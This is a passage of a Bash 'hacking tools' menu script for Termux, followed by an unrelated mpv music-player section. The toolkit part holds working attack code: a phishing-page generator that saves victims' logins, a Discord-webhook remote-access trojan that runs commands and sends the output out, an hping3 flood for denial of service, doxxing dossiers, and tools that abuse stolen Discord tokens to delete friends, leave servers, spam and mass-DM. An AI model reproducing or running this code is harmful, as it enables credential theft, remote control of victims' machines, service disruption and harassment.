}

ip_scanner(){
  read -rp "  IP/Host: " ip
  nslookup "$ip" || echo "  nslookup fail"
  ping -c 3 "$ip" || echo "  ping fail"
  pause
}

ip_port_scanner(){
  read -rp "  IP: " ip
  echo "  Top 1000 ports (nmap) …"
  nmap -F "$ip" || echo "  nmap fail"
  pause
}

ip_pinger(){
  read -rp "  IP: " ip
  ping -c 10 -i 0.2 "$ip" || echo "  ping fail"
  pause
}

d0x_create(){
  read -rp "  Target name: " name
  file="dossier-${name// /_}.txt"
  {
    echo "======== DOSSIER $name ========="
    read -rp "  Full name: " full; echo "Full: $full"
    read -rp "  Address: " addr; echo "Addr: $addr"
    read -rp "  Phone: " phone; echo "Phone: $phone"
    read -rp "  Email: " mail; echo "Email: $mail"
    echo "================================"
  } > "$file"
  echo "  Saved → $file"
  pause
}

d0x_tracker(){
  read -rp "  Dossier file: " f
  [[ -f "$f" ]] && cat "$f" || echo "  File not found"
  pause
}

image_exif(){
  read -rp "  Image path: " img
  exiftool "$img" 2>/dev/null || echo "  exiftool not found"
  pause
}

google_dork(){
  read -rp "  Domain: " d
  links=(
    "https://www.google.com/search?q=site:${d}+filetype:pdf"
    "https://www.google.com/search?q=site:${d}+intitle:index.of"
    "https://www.google.com/search?q=site:${d}+password"
    "https://www.google.com/search?q=site:${d}+username"
    "https://www.google.com/search?q=site:${d}+email"
  )
  for l in "${links[@]}"; do xdg-open "$l"; done
  echo "  5 dorks opened"
  pause
}

username_tracker(){
  read -rp "  Username: " u
  sites=(
    "https://github.com/$u"
    "https://instagram.com/$u"
    "https://twitter.com/$u"
    "https://facebook.com/$u"
    "https://tiktok.com/@$u"
  )
  for s in "${sites[@]}"; do xdg-open "$s"; done
  echo "  Opened 5 sites"
  pause
}

email_tracker(){
  read -rp "  Email: " em
  domain=${em#*@}
  nslookup -type=mx "$domain" || echo "  MX fail"
  echo "  Check breach: https://haveibeenpwned.com/$em"
  xdg-open "https://haveibeenpwned.com/$em"
  pause
}

email_lookup(){
  read -rp "  Email: " em
  if [[ "$em" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]; then
    domain=${em#*@}
    nslookup -type=mx "$domain"
  else
    echo "  Invalid email"
  fi
  pause
}

phone_lookup(){
  read -rp "  Phone (+62…): " p
  echo "  Format check: $p"
  echo "  Opening truecaller search …"
  xdg-open "https://www.truecaller.com/search/$p" &
  pause
}

ip_lookup(){
  read -rp "  IP: " ip
  curl -s "https://ipinfo.io/$ip" || echo "  ipinfo fail"
  pause
}

instagram_account(){
  read -rp "  IG username: " u
  xdg-open "https://instagram.com/$u" &
  echo "  Profile opened"
  pause
}

phishing_attack(){
  echo "  Phishing template generator"
  read -rp "  Target (fb/ig/steam): " t
  read -rp "  Output folder: " o
  mkdir -p "$o"
  cat >"$o/index.html" <<PHISH
<!doctype html><html><head><title>Login</title></head>
<body>
<h1>Fake $t login</h1>
<form action="grab.php" method="post">
User: <input name="user"><br>
Pass: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</body></html>
PHISH
  cat >"$o/grab.php" <<'PHP'
<?php file_put_contents("creds.txt", $_POST['user'].":".$_POST['pass']."\n", FILE_APPEND); header("Location: https://google.com"); ?>
PHP
  echo "  Phishing pages created in $o/"
  pause
}

zip_pass_crack(){
  read -rp "  Zip file: " z
  read -rp "  Wordlist: " w
  fcrackzip -u -D -p "$w" "$z" || echo "  fcrackzip fail"
  pause
}

hash_decrypt(){
  read -rp "  Hash (md5): " h
  echo "  Using crackstation.net …"
  xdg-open "https://crackstation.net/$h" &
  pause
}

hash_encrypt(){
  read -rp "  String to hash: " s
  echo "  MD5:    $(echo -n "$s" | md5sum | cut -d' ' -f1)"
  echo "  SHA1:   $(echo -n "$s" | sha1sum | cut -d' ' -f1)"
  echo "  SHA256: $(echo -n "$s" | sha256sum | cut -d' ' -f1)"
  pause
}

search_db(){
  echo "  Fake DB search (grep wordlist)"
  read -rp "  Keyword: " k
  read -rp "  Wordlist file: " w
  [[ -f "$w" ]] && grep -i "$k" "$w" || echo "  Wordlist not found"
  pause
}

dark_web_links(){
  links=(
    "https://thehiddenwiki.org"
    "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki/"
    "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"
    "https://www.reddit.com/r/onions"
    "https://tor.taxi"
  )
  for l in "${links[@]}"; do xdg-open "$l"; done
  echo "  5 links opened"
  pause
}

ip_generator(){
  o1=$(( RANDOM % 256 )); o2=$(( RANDOM % 256 ))
  o3=$(( RANDOM % 256 ))
  echo "  Random /24 → $o1.$o2.$o3.0/24"
  for i in {1..20}; do echo "    $o1.$o2.$o3.$i"; done
  pause
}

proxy_scraper(){
  echo "  Fetching free-proxy-list.net …"
  curl -s https://free-proxy-list.net | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}' | head -50
  pause
}

virus_builder(){
  echo "  Fake virus builder (Linux .sh)"
  read -rp "  Output name (ex: payload): " name
  cat >"${name}.sh" <<'VIR'
#!/bin/bash
# fake payload
for i in {1..10}; do
  echo " Infecting /system$i …" | wall
  sleep 1
done
echo " Troll complete – nothing happened :)" | wall
VIR
  chmod +x "${name}.sh"
  zip -P infected "${name}.zip" "${name}.sh" >/dev/null
  echo "  Fake virus created → ${name}.zip (pass: infected)"
  pause
}

py_obfuscator(){
  echo "  Python obfuscator (base64 + zlib)"
  read -rp "  Python file: " f
  [[ -f "$f" ]] || { echo "  File not found"; pause; return; }
  out="obf_${f}"
  python3 -c "
import base64,zlib,sys
with open(sys.argv[1]) as s: c=s.read()
o='import base64,zlib\\nexec(zlib.decompress(base64.b64decode({})))'
with open(sys.argv[2],'w') as w: w.write(o.format(repr(base64.b64encode(zlib.compress(c.encode())).decode())))
" "$f" "$out"
  echo "  Obfuscated → $out"
  pause
}

discord_rat(){
  echo "  Discord RAT builder (webhook reverse shell)"
  read -rp "  Webhook URL: " hook
  read -rp "  Output rat.py: " rat
  cat >"$rat" <<RAT
import os, requests, subprocess, time
WEBHOOK="$hook"
while True:
    try:
        r=requests.get(WEBHOOK+"/messages").json()
        if r:
            cmd=r[0]["content"]
            out=subprocess.run(cmd,shell=True,capture_output=True,text=True).stdout
            requests.post(WEBHOOK,json={"content":out[:1900]})
            requests.delete(WEBHOOK+"/messages/"+r[0]["id"])
    except: pass
    time.sleep(5)
RAT
  echo "  RAT saved → $rat  (run victim)"
  pause
}

website_dos(){
  read -rp "  Target IP: " ip
  read -rp "  Port (80): " port
  port=${port:-80}
  echo "  Starting hping3 flood (10s) …"
  sudo hping3 --flood --rand-source -p "$port" "$ip" &
  pid=$!
  sleep 10
  sudo kill $pid 2>/dev/null
  echo "  Flood stopped"
  pause
}

roblox_cookie_login(){
  read -rp "  Roblox cookie: " c
  echo "  Logging in via cookie …"
  curl -s -H "Cookie: .ROBLOSECURITY=$c" https://www.roblox.com/mobileapi/userinfo | jq .
  pause
}

roblox_cookie_info(){
  read -rp "  Roblox cookie: " c
  curl -s -H "Cookie: .ROBLOSECURITY=$c" https://users.roblox.com/v1/users/authenticated | jq .
  pause
}

roblox_id_info(){
  read -rp "  User ID: " id
  curl -s "https://users.roblox.com/v1/users/$id" | jq .
  pause
}

roblox_user_info(){
  read -rp "  Username: " u
  id=$(curl -s "https://api.roblox.com/users/get-by-username?username=$u" | jq -r .Id)
  curl -s "https://users.roblox.com/v1/users/$id" | jq .
  pause
}

discord_token_nuker(){
  read -rp "  Token: " t
  echo "  Leaving all guilds …"
  guilds=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/guilds | jq -r .[].id)
  for g in $guilds; do
    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/guilds/$g"
    echo "  Left $g"
  done
  echo "  Deleting friends …"
  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
  for f in $friends; do
    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/relationships/$f"
    echo "  Deleted friend $f"
  done
  echo "  Nuked."
  pause
}

discord_token_info(){
  read -rp "  Token: " t
  curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me | jq .
  pause
}

discord_token_joiner(){
  read -rp "  Token: " t
  read -rp "  Invite code (ex: abc123): " i
  curl -s -X POST -H "Authorization: $t" "https://discord.com/api/v9/invites/$i" | jq .
  pause
}

discord_token_leaver(){
  read -rp "  Token: " t
  read -rp "  Guild ID: " g
  curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/guilds/$g"
  echo "  Left guild"
  pause
}

discord_token_login(){
  echo "  Token login via browser (token login extension)"
  read -rp "  Token: " t
  echo "  Install extension: https://chrome.google.com/webstore/detail/discord-token-login"
  xdg-open "https://chrome.google.com/webstore/detail/discord-token-login"
  pause
}

discord_token_to_id_brute(){
  read -rp "  Token: " t
  id=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me | jq -r .id)
  echo "  Your ID: $id"
  echo "  Bruteforce nearby IDs (±100) …"
  for i in {1..100}; do
    testid=$((id+i))
    res=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/$testid" | jq -r .username)
    [[ "$res" != "null" ]] && echo "  Found user: $testid -> $res"
  done
  pause
}

discord_token_server_raid(){
  read -rp "  Token: " t
  read -rp "  Channel ID: " c
  read -rp "  Message: " m
  read -rp "  Jumlah: " n
  for i in $(seq 1 "$n"); do
    curl -s -X POST -H "Authorization: $t" -H "Content-Type: application/json" \
         -d "{\"content\":\"$m\"}" "https://discord.com/api/v9/channels/$c/messages" >/dev/null
    echo "  Spam $i"
    sleep 0.5
  done
  pause
}

discord_token_spammer(){
  discord_token_server_raid
}

discord_token_delete_friends(){
  read -rp "  Token: " t
  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
  for f in $friends; do
    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/relationships/$f"
    echo "  Deleted $f"
  done
  pause
}

discord_token_block_friends(){
  read -rp "  Token: " t
  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
  for f in $friends; do
    curl -s -X PUT -H "Authorization: $t" -d '{"type":2}' "https://discord.com/api/v9/users/@me/relationships/$f"
    echo "  Blocked $f"
  done
  pause
}

discord_token_mass_dm(){
  read -rp "  Token: " t
  read -rp "  Message: " m
  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
  for f in $friends; do
    ch=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/@me/channels" -d "{\"recipients\":[\"$f\"]}" | jq -r .id)
    curl -s -X POST -H "Authorization: $t" -d "{\"content\":\"$m\"}" "https://discord.com/api/v9/channels/$ch/messages" >/dev/null
    echo "  DM sent to $f"
  done
  pause
}

discord_token_delete_dm(){
  read -rp "  Token: " t
  dms=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/@me/channels" | jq -r .[].id)
  for d in $dms; do
    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/channels/$d"
    echo "  Deleted DM $d"
  done
  pause
}

discord_token_status_changer(){
  read -rp "  Token: " t
  read -rp "  Status text: " st
  read -rp "  Status (online/dnd/idle/invisible): " stat
  curl -s -X PATCH -H "Authorization: $t" -d "{\"status\":\"$stat\"}" "https://discord.com/api/v9/users/@me/settings" | jq .
  curl -s -X PATCH -H "Authorization: $t" -d "{\"custom_status\":{\"text\":\"$st\"}}" "https://discord.com/api/v9/users/@me/settings" | jq .
  echo "  Status updated"
  pause
}

discord_token_language_changer(){
  read -rp "  Token: " t
  read -rp "  Language (en-US): " lang
  lang=${lang:-en-US}
  curl -s -X PATCH -H "Authorization: $t" -d "{\"locale\":\"$lang\"}" "https://discord.com/api/v9/users/@me/settings" | jq .
  echo "  Language updated"
  pause
}

discord_token_house_changer(){
  read -rp "  Token: " t
  echo "  1=Bravery 2=Brilliance 3=Balance"
  read -rp "  House (1-3): " h
  houses=(1 2 3)
  curl -s -X POST -H "Authorization: $t" -d "{\"house_id\":${houses[$h-1]}}" "https://discord.com/api/v9/hypesquad/online" | jq .
  echo "  House updated"
  pause
}

discord_token_theme_changer(){
  read -rp "  Token: " t
  echo "  0=dark 1=light"
  read -rp "  Theme (0/1): " th
  curl -s -X PATCH -H "Authorization: $t" -d "{\"theme\":$th}" "https://discord.com/api/v9/users/@me/settings" | jq .
  echo "  Theme updated"
  pause
}

discord_token_generator(){
  echo "  Generating 10 random tokens (fake) …"
  for i in {1..10}; do
    head -c 24 /dev/urandom | base64 | tr -d '=' | tr '+/' '-_'
  done
  pause
}

discord_bot_server_nuker(){
  read -rp "  Bot token: " t
  read -rp "  Guild ID: " g
  echo "  Deleting channels …"
  channels=$(curl -s -H "Authorization: Bot $t" "https://discord.com/api/v9/guilds/$g/channels" | jq -r .[].id)
  for c in $channels; do
    curl -s -X DELETE -H "Authorization: Bot $t" "https://discord.com/api/v9/channels/$c"
    echo "  Deleted channel $c"
  done
  echo "  Nuked server"
  pause
}

discord_bot_invite_to_id(){
  read -rp "  Invite code: " i
  res=$(curl -s "https://discord.com/api/v9/invites/$i")
  echo "  Invite info:"
  echo "$res" | jq .
  pause
}

discord_server_info(){
  read -rp "  Invite code: " i
  res=$(curl -s "https://discord.com/api/v9/invites/$i")
  echo "  Server info:"
  echo "$res" | jq .
  pause
}

discord_webhook_info(){
  read -rp "  Webhook URL: " w
  curl -s "$w" | jq .
  pause
}

discord_webhook_delete(){
  read -rp "  Webhook URL to delete: " w
  curl -s -X DELETE "$w" && echo "  Webhook deleted"
  pause
}

discord_webhook_spammer(){
  read -rp "  Webhook URL: " w
  read -rp "  Message: " m
  read -rp "  Jumlah: " n
  for i in $(seq 1 "$n"); do
    curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"$m\"}" "$w" >/dev/null
    echo "  Spam $i"
    sleep 0.5
  done
  pause
}

discord_webhook_generator(){
  echo "  Create webhook (need MANAGE_WEBHOOKS permission)"
  read -rp "  Channel ID: " c
  read -rp "  Bot token: " t
  read -rp "  Webhook name: " n
  res=$(curl -s -X POST -H "Authorization: Bot $t" -d "{\"name\":\"$n\"}" "https://discord.com/api/v9/channels/$c/webhooks")
  echo "  Webhook created:"
  echo "$res" | jq .
  pause
}

discord_nitro_generator(){
  echo "  10 random Nitro codes:"
  for i in {1..10}; do
    printf "https://discord.gift/%s\n" "$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
  done
  pause
}

info_module(){
  echo "  $TOOL_NAME v$VERSION – DarkMenu merangkum fitur hacking"
  echo "  All 79 modules functional, All Base Fitur"
  pause
}

site_module(){
  xdg-open "$GITHUB"
  echo "  GitHub opened"
  pause
}



########## ROUTER UTAMA ########------
handle_choice(){
  case "$1" in
    00|0) return 1 ;;   # sinyal "user minta keluar"
    01|1) website_vuln_scanner ;;
    02|2) website_info_scanner ;;
    03|3) website_url_scanner ;;
    04|4) ip_scanner ;;
    05|5) ip_port_scanner ;;
    06|6) ip_pinger ;;
    10) d0x_create ;;
    11) d0x_tracker ;;
    12) image_exif ;;
    13) google_dork ;;
    14) username_tracker ;;
    15) email_tracker ;;
    16) email_lookup ;;
    17) phone_lookup ;;
    18) ip_lookup ;;
    19) instagram_account ;;
    20) phishing_attack ;;
    21) zip_pass_crack ;;
    22) hash_decrypt ;;
    23) hash_encrypt ;;
    24) search_db ;;
    25) dark_web_links ;;
    26) ip_generator ;;
    27) proxy_scraper ;;
    30) virus_builder ;;
    31) py_obfuscator ;;
    32) discord_rat ;;
    33) website_dos ;;
    34) proxy_scraper ;;
    40) roblox_cookie_login ;;
    41) roblox_cookie_info ;;
    42) roblox_id_info ;;
    43) roblox_user_info ;;
    50) discord_token_nuker ;;
    51) discord_token_info ;;
    52) discord_token_joiner ;;
    53) discord_token_leaver ;;
    54) discord_token_login ;;
    55) discord_token_to_id_brute ;;
    56) discord_token_server_raid ;;
    57) discord_token_spammer ;;
    58) discord_token_delete_friends ;;
    59) discord_token_block_friends ;;
    60) discord_token_mass_dm ;;
    61) discord_token_delete_dm ;;
    62) discord_token_status_changer ;;
    63) discord_token_language_changer ;;
    64) discord_token_house_changer ;;
    65) discord_token_theme_changer ;;
    66) discord_token_generator ;;
    67) discord_bot_server_nuker ;;
    68) discord_bot_invite_to_id ;;
    69) discord_server_info ;;
    70) discord_nitro_generator ;;
    71) discord_webhook_info ;;
    72) discord_webhook_delete ;;
    73) discord_webhook_spammer ;;
    74) discord_webhook_generator ;;
    [Ii]) info_module ;;
    [Ss]) site_module ;;
    [Nn]) MENU_NR=$(( MENU_NR % 3 + 1 )) ;;
    [Bb]) MENU_NR=$(( (MENU_NR+1) % 3 + 1 )) ;;
    *) echo "  Invalid choice"; pause ;;
  esac
}

########## akhir DarkMenu ##########
while true; do
    clear_screen
    case "$MENU_NR" in
        1) menu1 ;;
        2) menu2 ;;
        3) menu3 ;;
    esac
    printf "\n${GREEN}┏━${RED}[ ${GREEN}DANXY TOOLS V8.4 ${NC}${RED}]${GREEN}@${YELLOW}Termux${NC}${RED}]${GREEN}━${RED}[${RED}${W}${YELLOW}~/Menu-${YELLOW}${MENU_NR}${GREEN}]\n${GREEN}┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r choice

    
#    printf "\n┌──(%s@%s)─[%s~/Menu-%s]${RESET}\n└─$ " "$USER" "$TOOL_NAME" "$W" "$MENU_NR"
#    read -r choice
    handle_choice "$choice" || break
done

read -rp "  TEKAN ENTER UNTUK KEMBALI KE MENU AWAL … "
 clear 
}



















musik_album() {
SOCKET="$PREFIX/tmp/mpvsocket"
BAR_LEN=30
REFRESH_INTERVAL=0.6
ALBUM_DIR="$HOME/.ToolsV84_Musik"

# --- Colors ---
R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"
M="\033[35m"; C="\033[36m"; W="\033[0m"; GR="\033[90m"

mkdir -p "$PREFIX/tmp" "$ALBUM_DIR"

cleanup() {
  tput cnorm
  [ -n "$MPV_PID" ] && kill "$MPV_PID" 2>/dev/null || true
  rm -f "$SOCKET"
  printf "\n"
  exit 0
}
trap cleanup INT TERM EXIT

install_deps() {
  deps_pkg=(mpv socat jq)
  for p in "${deps_pkg[@]}"; do
    if ! command -v "$p" >/dev/null 2>&1; then
      pkg install -y "$p"
    fi
  done
  if ! python -c "import yt_dlp" >/dev/null 2>&1; then
    pip install -U yt-dlp >/dev/null 2>&1 || true
  fi
}

list_albums() {
  echo -e "${GR}──────────[ Albums ]──────────${W}"
  local i=1
  shopt -s nullglob
  for f in "$ALBUM_DIR"/*.txt; do
    printf " %d) %s\n" "$i" "$(basename "${f%.txt}")"
    i=$((i+1))
  done
  shopt -u nullglob
  if [ $i -eq 1 ]; then
    echo -e "${R}[ ∅ ] Tidak ada album.${W}"
  fi
  echo -e "${GR}────────────────────────────${W}"
}

album_file_for() {
 
  printf "%s/%s.txt" "$ALBUM_DIR" "$1"
}

create_album() {
  echo -ne "${B}[ + ]${W} Nama album baru: "
  read -r name
  [ -z "$name" ] && { echo -e "${R}[ ∅ ] Nama kosong.${W}"; sleep 1; return; }
  f=$(album_file_for "$name")
  if [ -f "$f" ]; then
    echo -e "${Y}[ ! ] Album sudah ada.${W}"; sleep 1; return
  fi
  : > "$f"
  echo -e "${G}[ ✔ ] Album '$name' dibuat.${W}"; sleep 1
}

delete_album() {
  list_albums
  echo -ne "${R}[ - ]${W} Nama album yang mau dihapus: "
  read -r name
  [ -z "$name" ] && { echo -e "${R}[ ∅ ] Nama kosong.${W}"; sleep 1; return; }
  f=$(album_file_for "$name")
  if [ -f "$f" ]; then
    rm -f "$f"
    echo -e "${Y}[ ✔ ] Album '$name' dihapus.${W}"
  else
    echo -e "${R}[ ∅ ] Album tidak ditemukan.${W}"
  fi
  sleep 1
}

select_album() {
  while true; do
    clear
    echo " "
    echo " "
    echo " "
    echo " "
    echo -e "${GR}=====[ PILIH ALBUM ]=====${W}"
    list_albums
    echo -e " a) Buat album baru"
    echo -e " d) Hapus album"
    echo -e " q) Kembali"
    echo -ne " Pilih (nomor/nama/a/d/q): "
    read -r sel
    
    if [[ "$sel" =~ ^[0-9]+$ ]]; then
      idx=$((sel))
      
      mapfile -t arr < <(ls "$ALBUM_DIR"/*.txt 2>/dev/null)
      if [ $idx -ge 1 ] && [ $idx -le "${#arr[@]}" ]; then
        ALBUM_NAME="$(basename "${arr[$((idx-1))]%.txt}")"
        ALBUM_FILE="${arr[$((idx-1))]}"
        echo -e "${G}[ ✔ ] Album dipilih: $ALBUM_NAME${W}"
        sleep 1
        break
      else
        echo -e "${R}[ ∅ ] Nomor tidak valid.${W}"; sleep 1
      fi
    else
      case "$sel" in
        a) create_album ;;
        d) delete_album ;;
        q) return 0 ;;
        "")
          echo "Masukkan pilihan..."; sleep 1 ;;
        *)
          # treat as name
          if [ -f "$(album_file_for "$sel")" ]; then
            ALBUM_NAME="$sel"
            ALBUM_FILE="$(album_file_for "$sel")"
            echo -e "${G}[ ✔ ] Album dipilih: $ALBUM_NAME${W}"
            sleep 1
            break
          else
            echo -e "${R}[ ∅ ] Album tidak ditemukan.${W}"; sleep 1
          fi
          ;;
      esac
    fi
  done
}

load_playlist() {
  PLAYLIST=()
  if [ -n "$ALBUM_FILE" ] && [ -f "$ALBUM_FILE" ]; then
    mapfile -t PLAYLIST < "$ALBUM_FILE"
  fi
}

save_playlist() {
  [ -n "$ALBUM_FILE" ] || return
  printf "%s\n" "${PLAYLIST[@]}" > "$ALBUM_FILE"
}

list_playlist() {
  clear
  echo -e "${GR}────────── PLAYLIST: ${ALBUM_NAME:-'(none)'} ──────────${W}"
  if [ ${#PLAYLIST[@]} -eq 0 ]; then
    echo -e "${R}[ ∅ ] Playlist kosong.${W}"
  else
    local i=1
    for url in "${PLAYLIST[@]}"; do
      echo -e "${C}$i.${W} $url"
      i=$((i+1))
    done
  fi
  echo -e "${GR}────────────────────────────────────────${W}"
  echo -n "Tekan Enter untuk kembali..."
  read
}

add_url() {
  echo -ne "${B}[ + ]${W} Masukkan URL YouTube (atau local path): "
  read -r newurl
  if [ -n "$newurl" ]; then
    PLAYLIST+=("$newurl")
    save_playlist
    echo -e "${G}[ ✔ ] URL ditambahkan ke album '${ALBUM_NAME}'.${W}"
    sleep 1
  fi
}

delete_url() {
  list_playlist
  echo -ne "${R}[ - ]${W} Nomor yang mau dihapus: "
  read -r idx
  if [[ "$idx" =~ ^[0-9]+$ ]] && [ "$idx" -ge 1 ] && [ "$idx" -le "${#PLAYLIST[@]}" ]; then
    unset 'PLAYLIST[idx-1]'
    PLAYLIST=("${PLAYLIST[@]}") # reindex
    save_playlist
    echo -e "${Y}[ ✔ ] URL dihapus.${W}"
    sleep 1
  else
    echo -e "${R}[ ∅ ] Nomor tidak valid.${W}"
    sleep 1
  fi
}

build_play_order() {
  PLAY_ORDER=()
  local n=${#PLAYLIST[@]}
  for ((i=0;i<n;i++)); do
    PLAY_ORDER+=($i)
  done
  if [ "$SHUFFLE" = "on" ]; then
    for ((i=n-1;i>0;i--)); do
      j=$((RANDOM % (i+1)))
      tmp=${PLAY_ORDER[i]}; PLAY_ORDER[i]=${PLAY_ORDER[j]}; PLAY_ORDER[j]=$tmp
    done
  fi
  ORDER_POS=0
}

start_mpv() {
  local url="$1"
  rm -f "$SOCKET"
  mpv --no-video --ytdl --ytdl-format=bestaudio --really-quiet \
      --input-ipc-server="$SOCKET" "$url" >/dev/null 2>&1 &
  MPV_PID=$!
  local waited=0
  while [ ! -S "$SOCKET" ]; do
    sleep 0.15
    waited=$((waited+1))
    if [ $waited -gt 80 ]; then
      printf "${R}[ ∅ ] Gagal memulai mpv.${W}\n"
      cleanup
    fi
  done
}

mpv_query() {
  local prop="$1"
  [ ! -S "$SOCKET" ] && return
  printf '{ "command": ["get_property", "%s"] }\n' "$prop" \
    | socat - UNIX-CONNECT:"$SOCKET" 2>/dev/null \
    | jq -r '.data // empty' 2>/dev/null
}

mpv_cmd() {
  [ -S "$SOCKET" ] || return
  printf '%s\n' "$1" | socat - UNIX-CONNECT:"$SOCKET" >/dev/null 2>&1
}

fmt_time() {
  local t=${1%.*}
  [ -z "$t" ] && t=0
  local m=$((t/60)); local s=$((t%60))
  printf "%02d:%02d" "$m" "$s"
}

build_bar() {
  local pos=${1%.*}; local dur=${2%.*}
  local filled=0
  if [ "$dur" -gt 0 ]; then
    filled=$(( pos * BAR_LEN / dur ))
    [ $filled -lt 0 ] && filled=0
    [ $filled -gt $BAR_LEN ] && filled=$BAR_LEN
  fi
  printf "%-${BAR_LEN}s" "$(printf "%0.s#" $(seq 1 $filled))"
}

draw_frame() {
  clear
  echo -e "${GR}  ──────────────────────────────────────────────${W}"
  echo -e "   ${C}  PLAY MUSIK BY TOOLS V8.4 - MULTI-ALBUM${W}"
  echo -e "${GR}  ──────────────────────────────────────────────${W}"
  echo -e "   🎵  Title   : "
  echo -e "   📀  Album   : ${M}${ALBUM_NAME}${W}"
  echo -e "   🔢  Urutan  : "
  echo -e "   ⚡  Status  : "
  echo -e "   🔊  Volume  : "
  echo -e "   ⏱  Progress : "
  echo -e "${GR}  ──────────────────────────────────────────────${W}"
  echo -e "   [1] Play/Pause   [4] Maju 5s    [8] Next"
  echo -e "   [2] Volume +     [5] Mundur 5s  [9] Prev"
  echo -e "   [3] Volume -     [6] Stop       [7] Quit->Menu"
  echo -e "   [a] Tambah URL   [d] Hapus URL  [l] Lihat playlist"
  echo -e "   [s] Musik Acak [r] Musik Mengulang"
  echo -e "${GR}  ──────────────────────────────────────────────${W}"
}

play_current_order() {

  if [ ${#PLAY_ORDER[@]} -eq 0 ]; then
    build_play_order
  fi
  cur_idx=${PLAY_ORDER[$ORDER_POS]}
  CUR_INDEX=$cur_idx
  url="${PLAYLIST[$CUR_INDEX]}"
  start_mpv "$url"
  draw_frame
}

advance_order_next() {
  ORDER_POS=$((ORDER_POS+1))
  if [ $ORDER_POS -ge ${#PLAY_ORDER[@]} ]; then
    if [ "$REPEAT" = "all" ]; then
      build_play_order
      ORDER_POS=0
    else

      if [ "$REPEAT" = "one" ]; then
        ORDER_POS=$((ORDER_POS-1))
      else
        return 1
      fi
    fi
  fi
  return 0
}

advance_order_prev() {
  if [ $ORDER_POS -le 0 ]; then
    ORDER_POS=$(( ${#PLAY_ORDER[@]} - 1 ))
  else
    ORDER_POS=$(( ORDER_POS - 1 ))
  fi
  return 0
}

main_loop() {
  tput civis
  while kill -0 "$MPV_PID" >/dev/null 2>&1; do
    title=$(mpv_query "media-title")
    [ -z "$title" ] && title=$(yt-dlp --get-title -q "${PLAYLIST[$CUR_INDEX]}" 2>/dev/null || echo "Unknown")

    pause_state=$(mpv_query "pause")
    idle_state=$(mpv_query "idle-active")

    if [ "$idle_state" = "true" ]; then
      # Auto next behavior
      if [ "$REPEAT" = "one" ]; then
        mpv_cmd '{ "command": ["seek", 0] }'
        mpv_cmd '{ "command": ["cycle", "pause"] }' >/dev/null 2>&1 || true
        # restart same track
        mpv_cmd '{ "command": ["set_property", "pause", false] }' >/dev/null 2>&1 || true
        sleep 0.3
        continue
      fi

      if advance_order_next; then
        mpv_cmd '{ "command": ["quit"] }'; sleep 0.2
        play_current_order
        continue
      else
      
        mpv_cmd '{ "command": ["quit"] }' 2>/dev/null || true
        echo -e "${GR}\n[ ∅ ] Playlist selesai. Kembali ke menu...${W}"
        sleep 1.2
        tput cnorm
        return 0
      fi
    fi

    if [ "$pause_state" = "true" ]; then
      status="${Y}Paused  ||${W}"
    else
      status="${G}Playing ▶${W}"
    fi

    vol=$(mpv_query "volume" | cut -d. -f1)
    [ -z "$vol" ] && vol="--"

    dur=$(mpv_query "duration"); pos=$(mpv_query "time-pos")
    dur=${dur:-0}; pos=${pos:-0}
    bar=$(build_bar "$pos" "$dur")
    posf=$(fmt_time "$pos"); durf=$(fmt_time "$dur")

   
    display_order_pos=$((ORDER_POS+1))
    tput cup 3 0;  echo -e "   🎵  Title   : ${M}${title:0:60}${W}              "
    tput cup 4 0;  echo -e "   📀  Album   : ${C}${ALBUM_NAME}${W}"
    tput cup 5 0;  echo -e "   🔢  Track   : ${C}${display_order_pos}/${#PLAY_ORDER[@]} (idx ${CUR_INDEX})${W}"
    tput cup 6 0;  echo -e "   ⚡  Status  : $status"
    tput cup 7 0;  echo -e "   🔊  Volume  : ${C}${vol}%${W}                   "
    tput cup 8 0;  echo -e "   ⏱  Progress : ${G}[${bar}]${W} ${posf}/${durf} "
    tput cup 17 0
    echo -ne "   ${B}[ ? ]${W} Tekan tombol: "

    read -s -n1 -t "$REFRESH_INTERVAL" key 2>/dev/null || key=""
    case "$key" in
      "" ) ;;
      " "|1) mpv_cmd '{ "command": ["cycle", "pause"] }' ;;
      2)    mpv_cmd '{ "command": ["add", "volume", 5] }' ;;
      3)    mpv_cmd '{ "command": ["add", "volume", -5] }' ;;
      4)    mpv_cmd '{ "command": ["seek", 5] }' ;;
      5)    mpv_cmd '{ "command": ["seek", -5] }' ;;
      6)    mpv_cmd '{ "command": ["stop"] }' ;;
      7)    # quit to album menu
            mpv_cmd '{ "command": ["quit"] }'; sleep 0.2
            tput cnorm
            return 0 ;;
      q|Q)  mpv_cmd '{ "command": ["quit"] }'; sleep 0.2; cleanup ;;
      8)    # next
            if advance_order_next; then
              mpv_cmd '{ "command": ["quit"] }'; sleep 0.2
              play_current_order
            fi ;;
      9)    # prev
            advance_order_prev
            mpv_cmd '{ "command": ["quit"] }'; sleep 0.2
            play_current_order ;;
